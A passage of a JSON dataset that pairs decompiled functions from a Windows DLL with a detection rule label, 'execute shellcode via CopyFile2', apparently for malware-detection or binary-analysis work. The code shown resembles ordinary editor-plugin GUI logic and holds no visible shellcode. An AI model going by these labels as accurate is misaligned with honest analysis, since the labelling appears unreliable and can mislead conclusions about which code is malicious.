= *(puVar7 + 4);\n            puVar3 = arg3 + (-0x50 - arg1) + puVar1;\n            *puVar3 = *(puVar7 + -1);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            puVar7[-1] = 0;\n            *puVar7 = 7;\n            *(puVar7 + -3) = 0;\n            puVar7 = puVar1;\n        } while (puVar2 != arg2);\n    }\n    return puVar8;\n}\n",
        "token_count": 801
    },
    "18003f81": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18003f810(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    char cVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    ulong uVar8;\n    int64_t arg1;\n    ushort *puVar9;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar extraout_XMM0_01 [16];\n    uchar auStack696 [32];\n    uint32_t uStack664;\n    uint uStack656;\n    uint uStack648;\n    ushort uStack632;\n    unkbyte6 Stack630;\n    uint uStack616;\n    uint uStack612;\n    uint uStack608;\n    uint uStack604;\n    ulong uStack600;\n    uchar auStack592 [16];\n    uchar auStack576 [24];\n    int16_t aiStack552 [264];\n    uint64_t uStack24;\n    \n    uVar5 = *0x18012a388;\n    uStack24 = *0x180123080 ^ auStack696;\n    cVar4 = (**(*0x180123f60 + 0x68))(0x180123f60);\n    if (cVar4 == '\\0') {\n        *0x180123f70 = *0x18012a390;\n        *0x180123f68 = uVar5;\n        (**(*0x180123f60 + 0x60))(0x180123f60, 0x27d8, 0, 1);\n    }\n    *0x180123fb8 = (**0x1800de798)(*0x180123f78, 0x27da);\n    *0x180123fc0 = (**0x1800de798)(*0x180123f78, 0x27de);\n    *0x180123fc8 = (**0x1800de798)(*0x180123f78, 0x27ee);\n    *0x180123fd0 = (**0x1800de798)(*0x180123f78, 0x27f2);\n    *0x180123fd8 = (**0x1800de798)(*0x180123f78, 0x2802);\n    *0x180123fe0 = (**0x1800de798)(*0x180123f78, 0x2804);\n    *0x180123fe8 = (**0x1800de798)(*0x180123f78, 0x2806);\n    uVar5 = (**0x1800de798)(*0x180123f78, 0x27db);\n    iVar6 = (**0x1800de638)(*0x18012a388, 0x2336);\n    if (iVar6 != 0) {\n        (**0x1800de7f0)(uVar5, 0xf7, 0, iVar6);\n        (**0x1800de0a8)(iVar6);\n    }\n    uStack664 = uStack664 & 0xffffff00;\n    fcn.180067d90(*0x180123f78, 0x27db, 0, L\"Move down the selected Fold Structure\");\n    uVar5 = (**0x1800de798)(*0x180123f78, 0x27dc);\n    iVar6 = (**0x1800de638)(*0x18012a388, 0x2337);\n    if (iVar6 != 0) {\n        (**0x1800de7f0)(uVar5, 0xf7, 0, iVar6);\n        (**0x1800de0a8)(iVar6);\n    }\n    uStack664 = uStack664 & 0xffffff00;\n    fcn.180067d90(*0x180123f78, 0x27dc, 0, L\"Move up the selected Fold Structure\");\n    uVar5 = (**0x1800de798)(*0x180123f78, 0x27ef);\n    iVar6 = (**0x1800de638)(*0x18012a388, 0x2336);\n    if (iVar6 != 0) {\n        (**0x1800de7f0)(uVar5, 0xf7, 0, iVar6);\n        (**0x1800de0a8)(iVar6);\n    }\n    uStack664 = uStack664 & 0xffffff00;\n    fcn.180067d90(*0x180123f78, 0x27ef, 0, L\"Move down the selected Fold Block\");\n    uVar5 = (**0x1800de798)(*0x180123f78, 0x27f0);\n    iVar6 = (**0x1800de638)(*0x18012a388, 0x2337);\n    if (iVar6 != 0) {\n        (**0x1800de7f0)(uVar5, 0xf7, 0, iVar6);\n        (**0x1800de0a8)(iVar6);\n    }\n    uStack664 = uStack664 & 0xffffff00;\n    fcn.180067d90(*0x180123f78, 0x27f0, 0, L\"Move up the selected Fold Block\");\n    uVar5 = (**0x1800de798)(*0x180123f78, 0x281b);\n    iVar6 = (**0x1800de638)(*0x18012a388, 0x2335);\n    if (iVar6 != 0) {\n        (**0x1800de7f0)(uVar5, 0xf7, 0, iVar6);\n        (**0x1800de0a8)(iVar6);\n    }\n    uStack664 = uStack664 & 0xffffff00;\n    fcn.180067d90(*0x180123f78, 0x281b, 0, 0x1800f7a98);\n    fcn.180066d20(0x180123f60);\n    uVar5 = (**0x1800de798)(*0x180123f78, 0x27f3);\n    (**0x1800de5f0)(uVar5, aiStack552, 0x104);\n    iVar6 = -1;\n    uStack616 = *0x180101900;\n    uStack612 = *0x180101904;\n    uStack608 = *0x180101908;\n    uStack604 = *0x18010190c;\n    uStack632 = 0;\n    do {\n        iVar6 = iVar6 + 1;\n    } while (aiStack552[iVar6] != 0);\n    fcn.180010d70(&uStack632, aiStack552, iVar6);\n    uVar3 = *0x180123f78;\n    uStack600 = 0;\n    uVar7 = (**0x1800de7c0)(*0x180123f78);\n    uVar8 = (**0x1800de7f0)(uVar3, 0x31, 0);\n    (**0x1800de048)(uVar7, uVar8);\n    puVar9 = &uStack632;\n    if (7 < CONCAT44(uStack604, uStack608)) {\n        puVar9 = CONCAT62(Stack630, uStack632);\n    }\n    (**0x1800de060)(uVar7, puVar9, uStack616, &uStack600);\n    (**0x1800de5a8)(uVar3, uVar7);\n    auStack592 = extraout_XMM0;\n    if (7 < CONCAT44(uStack604, uStack608)) {\n        iVar2 = CONCAT62(Stack630, uStack632);\n        iVar6 = CONCAT44(uStack604, uStack608) * 2;\n        arg1 = iVar2;\n        if (0xfff < iVar6 + 2U) {\n            arg1 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - arg1) - 8U) {\n                fcn.1800b3528(arg1, iVar6 + 0x29);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1);\n        auStack592 = extraout_XMM0_00;\n    }\n    auStack592 = auStack592 & 0x0;\n    (**0x1800de5d0)(uVar5, auStack592);\n    (**0x1800de6e0)(uVar5, *0x180123f78, auStack592, 2);\n    uVar5 = (**0x1800de798)(*0x180123f78, 0x27f4);\n    auStack576._0_16_ = extraout_XMM0_01 & 0x0;\n    (**0x1800de5d0)(uVar5, auStack576);\n    (**0x1800de6e0)(uVar5, *0x180123f78, auStack576, 2);\n    uStack648 = 5;\n    uStack656 = 0;\n    uStack664 = 0;\n    (**0x1800de7c8)(uVar5, 0, uStack600 + auStack592._0_4_, auStack576._4_4_);\n    (**0x1800de7f0)(*0x180123f70, 0x806, 0, *0x180123f78);\n    fcn.180040e00();\n    fcn.180041850(0x180123f60);\n    fcn.180040ce0(0x180123f60);\n    fcn.18008fb00(uStack24 ^ auStack696);\n    return;\n}\n",
        "token_count": 2179
    },
    "18004185": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint64_t fcn.180041850(int64_t arg1)\n\n{\n    int64_t *arg1_00;\n    int32_t iVar1;\n    ulong uVar2;\n    uint16_t *arg1_01;\n    uint16_t *arg2;\n    int64_t arg2_00;\n    uint32_t uVar3;\n    int64_t arg1_02;\n    int64_t iVar4;\n    int64_t arg1_03;\n    uint64_t uVar5;\n    uint64_t arg2_02;\n    uint16_t auStack72 [8];\n    ulong uStack56;\n    ulong uStack48;\n    uint64_t arg2_01;\n    \n    uStack48 = 7;\n    arg2_01 = 0;\n    arg1_01 = auStack72;\n    uStack56 = 0;\n    auStack72[0] = 0;\n    fcn.180010d70(arg1_01, 0x1800f715c, 0);\n    arg2 = auStack72;\n    iVar1 = fcn.1800062e0(arg1_01, arg2);\n    arg1_00 = arg1 + 0xc0;\n    arg2_02 = iVar1;\n    iVar4 = *(arg1 + 200);\n    arg1_02 = *arg1_00;\n    if (arg1_02 != iVar4) {\n        do {\n            fcn.180048db0(arg1_02 + 0x48, arg2);\n            fcn.180042e30(arg1_02);\n            arg1_02 = arg1_02 + 0x60;\n        } while (arg1_02 != iVar4);\n        arg1_02 = *arg1_00;\n    }\n    *(arg1 + 200) = arg1_02;\n    iVar4 = *arg1_00;\n    arg2_00 = (arg1_02 - iVar4) / 6 + (arg1_02 - iVar4 >> 0x3f);\n    uVar5 = (arg2_00 >> 4) - (arg2_00 >> 0x3f);\n    if (arg2_02 < uVar5) {\n        iVar4 = arg2_02 * 0x60 + iVar4;\n        for (arg1_03 = iVar4; arg1_03 != arg1_02; arg1_03 = arg1_03 + 0x60) {\n            fcn.180048db0(arg1_03 + 0x48, arg2_00);\n            fcn.180042e30(arg1_03);\n        }\n        *(arg1 + 200) = iVar4;\n    }\n    else if (uVar5 < arg2_02) {\n        iVar4 = *(arg1 + 0xd0) - iVar4;\n        if (iVar4 / 0x60 < arg2_02) {\n            fcn.180049970(arg1_00, arg2_02);\n        }\n        else {\n            uVar2 = fcn.180049740(iVar4, arg1_02, arg2_02 - uVar5);\n            *(arg1 + 200) = uVar2;\n        }\n    }\n    if (0 < iVar1) {\n        do {\n            uStack56 = 0;\n            uStack48 = 0xf;\n            auStack72[0] = auStack72[0] & 0xff00;\n            fcn.180011120(auStack72, 0x1800f4777, 0);\n            fcn.180041a10(arg1, arg2_01, auStack72, arg1 + 0x30);\n            uVar3 = arg2_01 + 1;\n            arg2_01 = uVar3;\n        } while (uVar3 < iVar1);\n    }\n    return (*(arg1 + 200) - *arg1_00) / 0x60;\n}\n",
        "token_count": 865
    },
    "180048c7": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180048c70(int64_t *arg1, uint64_t arg2)\n\n{\n    ulong *puVar1;\n    uint64_t uVar2;\n    uchar (*pauVar3) [16];\n    uchar (*pauVar4) [16];\n    int64_t iVar5;\n    uchar (*arg1_00) [16];\n    \n    pauVar3 = arg1[1];\n    iVar5 = *arg1;\n    uVar2 = pauVar3 - iVar5 >> 6;\n    if (arg2 < uVar2) {\n        pauVar4 = arg2 * 0x40 + iVar5;\n        for (arg1_00 = pauVar4; arg1_00 != pauVar3; arg1_00 = arg1_00[4]) {\n            fcn.180042e30(arg1_00);\n        }\n        arg1[1] = pauVar4;\n        return;\n    }\n    if (uVar2 < arg2) {\n        if (arg1[2] - iVar5 >> 6 < arg2) {\n            fcn.180049c30(arg1, arg2);\n            return;\n        }\n        iVar5 = arg2 - uVar2;\n        if (iVar5 != 0) {\n            puVar1 = pauVar3[3] + 8;\n            do {\n                *pauVar3 = ZEXT816(0);\n                pauVar3[1] = ZEXT816(0);\n                pauVar3[2] = ZEXT816(0);\n                pauVar3[3] = ZEXT816(0);\n                (*pauVar3)[0] = 0;\n                pauVar3 = pauVar3[4];\n                puVar1[-5] = 0;\n                puVar1[-4] = 0xf;\n                puVar1[-1] = 0;\n                *puVar1 = 7;\n                *(puVar1 + -3) = 0;\n                iVar5 = iVar5 + -1;\n                puVar1 = puVar1 + 8;\n            } while (iVar5 != 0);\n        }\n        arg1[1] = pauVar3;\n    }\n    return;\n}\n",
        "token_count": 478
    },
    "18004a2d": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.18004a2d0(ulong *arg1, ulong *arg2, uint *arg3)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint *puVar7;\n    ulong *puVar8;\n    \n    if (arg1 != arg2) {\n        puVar7 = arg3;\n        puVar8 = arg1 + 7;\n        do {\n            *(arg3 + (-0x28 - arg1) + puVar8) = 0;\n            *(arg3 + (-0x20 - arg1) + puVar8) = 0;\n            uVar4 = *(puVar8 + -0x34);\n            uVar5 = *(puVar8 + -6);\n            uVar6 = *(puVar8 + -0x2c);\n            puVar1 = puVar8 + 8;\n            puVar2 = puVar8 + 1;\n            *puVar7 = *(puVar8 + -7);\n            puVar7[1] = uVar4;\n            puVar7[2] = uVar5;\n            puVar7[3] = uVar6;\n            uVar4 = *(puVar8 + -0x24);\n            uVar5 = *(puVar8 + -4);\n            uVar6 = *(puVar8 + -0x1c);\n            puVar7[4] = *(puVar8 + -5);\n            puVar7[5] = uVar4;\n            puVar7[6] = uVar5;\n            puVar7[7] = uVar6;\n            puVar8[-5] = 0;\n            puVar7 = puVar7 + 0x10;\n            puVar8[-4] = 0xf;\n            *(puVar8 + -7) = 0;\n            *(arg3 + (-0x48 - arg1) + puVar1) = 0;\n            *(arg3 + (-0x40 - arg1) + puVar1) = 0;\n            uVar4 = *(puVar8 + -0x14);\n            uVar5 = *(puVar8 + -2);\n            uVar6 = *(puVar8 + -0xc);\n            puVar3 = arg3 + (-0x58 - arg1) + puVar1;\n            *puVar3 = *(puVar8 + -3);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            uVar4 = *(puVar8 + -4);\n            uVar5 = *puVar8;\n            uVar6 = *(puVar8 + 4);\n            puVar3 = arg3 + (-0x48 - arg1) + puVar1;\n            *puVar3 = *(puVar8 + -1);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            puVar8[-1] = 0;\n            *puVar8 = 7;\n            *(puVar8 + -3) = 0;\n            puVar8 = puVar1;\n        } while (puVar2 != arg2);\n    }\n    return;\n}\n",
        "token_count": 745
    },
    "18005258": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint * fcn.180052580(ulong *arg1, ulong *arg2, uint *arg3)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    ulong *puVar7;\n    uint *puVar8;\n    \n    puVar8 = arg3;\n    if (arg1 != arg2) {\n        puVar7 = arg1 + 8;\n        do {\n            *(arg3 + (-0x30 - arg1) + puVar7) = 0;\n            *(arg3 + (-0x28 - arg1) + puVar7) = 0;\n            uVar4 = *(puVar7 + -0x3c);\n            uVar5 = *(puVar7 + -7);\n            uVar6 = *(puVar7 + -0x34);\n            puVar1 = puVar7 + 9;\n            *puVar8 = *(puVar7 + -8);\n            puVar8[1] = uVar4;\n            puVar8[2] = uVar5;\n            puVar8[3] = uVar6;\n            uVar4 = *(puVar7 + -0x2c);\n            uVar5 = *(puVar7 + -5);\n            uVar6 = *(puVar7 + -0x24);\n            puVar8[4] = *(puVar7 + -6);\n            puVar8[5] = uVar4;\n            puVar8[6] = uVar5;\n            puVar8[7] = uVar6;\n            puVar7[-6] = 0;\n            puVar8 = puVar8 + 0x12;\n            puVar7[-5] = 7;\n            *(puVar7 + -8) = 0;\n            uVar4 = *(puVar7 + -0x1c);\n            uVar5 = *(puVar7 + -3);\n            uVar6 = *(puVar7 + -0x14);\n            puVar3 = arg3 + (-0x68 - arg1) + puVar1;\n            *puVar3 = *(puVar7 + -4);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            *(arg3 + (-0x58 - arg1) + puVar1) = 0;\n            *(arg3 + (-0x50 - arg1) + puVar1) = 0;\n            *(arg3 + (-0x48 - arg1) + puVar1) = 0;\n            *(arg3 + (-0x58 - arg1) + puVar1) = puVar7[-2];\n            *(arg3 + (-0x50 - arg1) + puVar1) = puVar7[-1];\n            *(arg3 + (-0x48 - arg1) + puVar1) = *puVar7;\n            puVar2 = puVar7 + 1;\n            puVar7[-2] = 0;\n            puVar7[-1] = 0;\n            *puVar7 = 0;\n            puVar7 = puVar1;\n        } while (puVar2 != arg2);\n    }\n    return puVar8;\n}\n",
        "token_count": 734
    },
    "180057fb": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180057fb0(ulong arg1)\n\n{\n    ulong uVar1;\n    char in_DL;\n    int64_t iVar2;\n    uchar auStack136 [32];\n    uchar auStack104 [16];\n    ulong uStack88;\n    ulong uStack80;\n    uchar auStack72 [16];\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack40 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack136;\n    uStack24 = CONCAT44(uStack24._4_4_, 0xffffffff);\n    (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, &uStack24);\n    if (-1 < uStack24) {\n        iVar2 = *0x18012a398;\n        if (uStack24 != 0) {\n            iVar2 = *0x18012a3a0;\n        }\n        if (iVar2 != 0) {\n            (**0x1800de7f0)(iVar2, 0x7f0, 0, 0);\n            uVar1 = (**0x1800de7f0)(iVar2, 0x7d6, 0, 0);\n            (**0x1800de7f0)(iVar2, 0x7f1, uVar1, 0x20);\n            uStack88 = 0;\n            uStack80 = 0xf;\n            auStack104[0] = 0;\n            fcn.180011120(auStack104, 0x1800f4876, 0);\n            fcn.1800608d0(arg1, auStack104);\n            uStack24 = auStack104;\n            uStack88 = 0;\n            uStack80 = 0xf;\n            auStack104[0] = 0;\n            fcn.180011120(auStack104, 0x1800f48b7, 0);\n            uStack56 = 0;\n            uStack48 = 0xf;\n            auStack72[0] = 0;\n            fcn.180011120(auStack72, 0x1800f48b6, 0);\n            fcn.1800609f0(arg1, auStack72, auStack104);\n            fcn.180061430(arg1);\n            if (in_DL != '\\0') {\n                fcn.180055a10(arg1);\n                fcn.180055f20(arg1);\n            }\n        }\n    }\n    fcn.18008fb00(uStack16 ^ auStack136);\n    return;\n}\n",
        "token_count": 608
    },
    "180056dc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180056dc0(ulong noname_0, int64_t **arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    uint64_t uVar4;\n    char cVar5;\n    int32_t iVar6;\n    ulong arg2_00;\n    uchar *puVar7;\n    int64_t **arg1;\n    int64_t *arg1_00;\n    uchar *puVar8;\n    uchar *arg1_01;\n    uchar auStack168 [32];\n    uchar uStack136;\n    uchar uStack128;\n    ulong uStack120;\n    uchar auStack104 [32];\n    int64_t **ppiStack72;\n    uchar uStack64;\n    unkbyte7 Stack63;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint64_t uStack32;\n    \n    uStack120 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack168;\n    uStack48 = *0x180101910;\n    uStack44 = *0x180101914;\n    uStack40 = *0x180101918;\n    uStack36 = *0x18010191c;\n    uStack64 = 0;\n    ppiStack72 = arg2;\n    cVar5 = fcn.1800602c0(0x180124790, &uStack64);\n    uVar4 = CONCAT44(uStack36, uStack40);\n    arg1_01 = CONCAT71(Stack63, uStack64);\n    if (cVar5 == '\\0') {\ncode_r0x000180056f75:\n        (**0x1800de710)(*0x1801247a8, \n                        L\"The currently active document is of a different File Type.\\r\\n\\r\\nUnable to jump to the specified field.\"\n                        , 0x1800fc980, 0x10);\n        if (0xf < uVar4) {\n            if (0xfff < uVar4 + 1) {\n                puVar8 = *(arg1_01 + -8);\njoined_r0x000180056fc8:\n                puVar7 = arg1_01 + (-8 - puVar8);\n                arg1_01 = puVar8;\n                if (0x1f < puVar7) goto code_r0x000180056fd5;\n            }\ncode_r0x000180056ec6:\n            fcn.18008fb24(arg1_01);\n        }\n    }\n    else {\n        puVar8 = &uStack64;\n        if (0xf < uVar4) {\n            puVar8 = arg1_01;\n        }\n        arg1 = arg2;\n        if (0xf < arg2[3]) {\n            arg1 = *arg2;\n        }\n        if ((arg2[2] != CONCAT44(uStack44, uStack48)) || (iVar6 = fcn.1800ae4d0(arg1, puVar8, arg2[2]),  iVar6 != 0))\n        goto code_r0x000180056f75;\n        if (arg3 == *0x180124848) {\n            arg2_00 = fcn.18000de50(auStack104, arg2);\n            uStack128 = 1;\n            uStack136 = 0;\n            fcn.18005bdc0(0x180124790, arg2_00, arg4);\n        }\n        else {\n            (**0x1800de710)(*0x1801247a8, \n                            L\"Caret has moved to a different Record Type.\\r\\n\\r\\nUnable to jump to the specified field.\"\n                            , 0x1800fc9b0, 0x10);\n        }\n        if (0xf < uVar4) {\n            if (0xfff < uVar4 + 1) {\n                puVar8 = *(arg1_01 + -8);\n                goto joined_r0x000180056fc8;\n            }\n            goto code_r0x000180056ec6;\n        }\n    }\n    piVar1 = arg2[3];\n    if (0xf < piVar1) {\n        piVar2 = *arg2;\n        arg1_00 = piVar2;\n        if (0xfff < piVar1 + 1U) {\n            arg1_00 = piVar2[-1];\n            if (0x1f < (piVar2 - arg1_00) - 8U) {\n                fcn.1800b3528(piVar2 - arg1_00, piVar1 + 5);\ncode_r0x000180056fd5:\n                fcn.1800b3528();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    *arg2 = 0;\n    arg2[3] = 0xf;\n    arg2[2] = NULL;\n    fcn.18008fb00(uStack32 ^ auStack168);\n    return;\n}\n",
        "token_count": 1131
    },
    "18005bdc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.18005bdc0(int64_t arg1, int64_t *arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    char in_R9B;\n    char in_stack_00000028;\n    char in_stack_00000030;\n    uchar auStack184 [32];\n    int32_t *piStack152;\n    int32_t *piStack144;\n    int32_t iStack136;\n    int32_t aiStack132 [3];\n    uchar auStack120 [32];\n    ulong uStack88;\n    int32_t iStack80;\n    int64_t *piStack72;\n    uint64_t uStack64;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ auStack184;\n    iStack80 = -1;\n    piStack72 = arg2;\n    (**0x1800de7f0)(*0x18012a390, 0x7ec);\n    if (-1 < iStack80) {\n        iVar6 = *0x18012a398;\n        if (iStack80 != 0) {\n            iVar6 = *0x18012a3a0;\n        }\n        if (iVar6 != 0) {\n            iVar3 = (**0x1800de7f0)(iVar6, 0x7d8);\n            if (-1 < arg3) {\n                iStack136 = 0;\n                aiStack132[0] = 0;\n                uVar5 = fcn.18000de50(auStack120, arg2);\n                piStack144 = aiStack132;\n                piStack152 = &iStack136;\n                iVar4 = fcn.18005ba70(arg1, uVar5, arg3, 1);\n                if (-1 < iVar4) {\n                    if (in_R9B == '\\0') {\n                        if (in_stack_00000028 == '\\0') {\n                            if ((iVar3 == iStack136) && (*(arg1 + 0xb0) < iVar3)) {\n                                uVar5 = fcn.18000de50(auStack120, arg2);\n                                arg3._0_4_ = arg3 - 1;\n                                goto code_r0x00018005bfa0;\n                            }\n                        }\n                        else if ((iVar3 == aiStack132[0]) && (iVar3 < *(arg1 + 0xbc) + -1)) {\n                            uVar5 = fcn.18000de50(auStack120, arg2);\n                            arg3._0_4_ = arg3 + 1;\ncode_r0x00018005bfa0:\n                            piStack144 = aiStack132;\n                            piStack152 = &iStack136;\n                            iVar3 = fcn.18005ba70(arg1, uVar5, arg3, 1);\n                            if (iVar3 < 0) goto code_r0x00018005bf27;\n                        }\n                    }\n                    (**0x1800de7f0)(iVar6, 0x962, 0x18);\n                    iVar3 = iStack136;\n                    if (in_stack_00000028 != '\\0') {\n                        iVar3 = aiStack132[0];\n                    }\n                    (**0x1800de7f0)(iVar6, 0x7e9, iVar3, 0);\n                    if (in_stack_00000030 != '\\0') {\n                        piStack144 = NULL;\n                        piStack152 = piStack152 & 0xffffffff00000000;\n                        iVar6 = (**0x1800de420)(0, 0, 0x180062d30, 0);\n                        if (iVar6 != 0) {\n                            (**0x1800de428)(iVar6);\n                        }\n                    }\n                    fcn.1800613b0();\n                }\ncode_r0x00018005bf27:\n                uVar1 = arg2[3];\n                if (0xf < uVar1) {\n                    iVar6 = *arg2;\n                    iVar7 = iVar6;\n                    if (0xfff < uVar1 + 1) {\n                        iVar7 = *(iVar6 + -8);\n                        iVar6 = iVar6 - iVar7;\n                        if (0x1f < iVar6 - 8U) goto code_r0x00018005c06f;\n                    }\n                    fcn.18008fb24(iVar7);\n                }\n                *arg2 = 0;\n                goto code_r0x00018005bebb;\n            }\n            if (*(arg1 + 0xbc) <= iVar3) {\n                (**0x1800de7f0)(iVar6, 0x7e9, *(arg1 + 0xbc) + -1, 0);\n            }\n        }\n    }\n    uVar1 = arg2[3];\n    if (0xf < uVar1) {\n        iVar6 = *arg2;\n        iVar7 = iVar6;\n        if (0xfff < uVar1 + 1) {\n            iVar7 = *(iVar6 + -8);\n            iVar6 = iVar6 - iVar7;\n            if (0x1f < iVar6 - 8U) {\ncode_r0x00018005c06f:\n                fcn.1800b3528(iVar6, uVar1 + 0x28);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    *arg2 = 0;\ncode_r0x00018005bebb:\n    arg2[3] = 0xf;\n    arg2[2] = 0;\n    fcn.18008fb00(uStack64 ^ auStack184);\n    return;\n}\n",
        "token_count": 1290
    },
    "18006296": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180062960(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ushort *puVar3;\n    ulong uVar4;\n    ulong uVar5;\n    int64_t *piVar6;\n    uint32_t in_EDX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint64_t arg2;\n    int64_t iVar9;\n    ushort *puVar10;\n    uchar auStack200 [32];\n    uint uStack168;\n    ulong uStack160;\n    ulong uStack152;\n    ushort uStack136;\n    ushort uStack134;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    int64_t iStack120;\n    uint64_t uStack112;\n    ulong uStack104;\n    int64_t aiStack96 [3];\n    uint64_t uStack72;\n    uint auStack64 [2];\n    uint uStack56;\n    uint uStack52;\n    uint64_t uStack48;\n    \n    uStack104 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack200;\n    uVar4 = (**0x1800de6a8)();\n    (**0x1800de6c8)(uVar4, 0, 0xff, L\"All Levels\");\n    (**0x1800de6c8)(uVar4, 0x800, 0, 0);\n    arg2 = 1;\n    do {\n        iVar7 = arg2;\n        uVar5 = fcn.180020b50(aiStack96, arg2);\n        piVar6 = fcn.180014b80(uVar5, arg2, L\"Level \", 6);\n        uStack132 = *(piVar6 + 4);\n        puVar3 = *piVar6;\n        uStack128 = *(piVar6 + 1);\n        uStack124 = *(piVar6 + 0xc);\n        uStack136 = *piVar6;\n        uStack134 = *piVar6 >> 0x10;\n        iStack120 = piVar6[2];\n        uStack112 = piVar6[3];\n        piVar6[2] = 0;\n        piVar6[3] = 7;\n        *piVar6 = 0;\n        puVar10 = &uStack136;\n        if (7 < uStack112) {\n            puVar10 = puVar3;\n        }\n        (**0x1800de6c8)(uVar4, 0, iVar7, puVar10);\n        if (7 < uStack112) {\n            iVar2 = CONCAT44(uStack132, CONCAT22(uStack134, uStack136));\n            iVar9 = iVar2;\n            if (0xfff < uStack112 * 2 + 2) {\n                iVar9 = *(iVar2 + -8);\n                if (0x1f < (iVar2 - iVar9) - 8U) {\n                    fcn.1800b3528(iVar9, uStack112 * 2 + 0x29);\n                    goto code_r0x000180062bb6;\n                }\n            }\n            fcn.18008fb24(iVar9);\n        }\n        iStack120 = 0;\n        uStack112 = 7;\n        uStack136 = 0;\n        if (7 < uStack72) {\n            iVar9 = aiStack96[0];\n            if ((0xfff < uStack72 * 2 + 2) && (iVar9 = *(aiStack96[0] + -8),  0x1f < (aiStack96[0] - iVar9) - 8U)) {\ncode_r0x000180062bb6:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18008fb24(iVar9);\n        }\n        uVar8 = iVar7 + 1;\n        arg2 = uVar8;\n        if (10 < uVar8) {\n            uVar8 = in_EDX & 0xff ^ 1;\n            uVar5 = (**0x1800de798)(*(arg1 + 0x18), uVar8 * 2 + 0x237c);\n            (**0x1800de700)(uVar5, auStack64);\n            if ((in_EDX & 0xff) != '\\0') {\n                uStack56 = auStack64[0];\n            }\n            uStack152 = 0;\n            uStack160 = *(arg1 + 0x18);\n            uStack168 = 0;\n            (**0x1800de6b0)(uVar4, uVar8 * 8 | 0x180, uStack56, uStack52);\n            iVar9 = 10;\n            do {\n                (**0x1800de6c0)(uVar4, 0, 0x400);\n                iVar9 = iVar9 + -1;\n            } while (iVar9 != 0);\n            (**0x1800de6b8)(uVar4);\n            fcn.18008fb00(uStack48 ^ auStack200);\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 1149
    },
    "1800641b": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
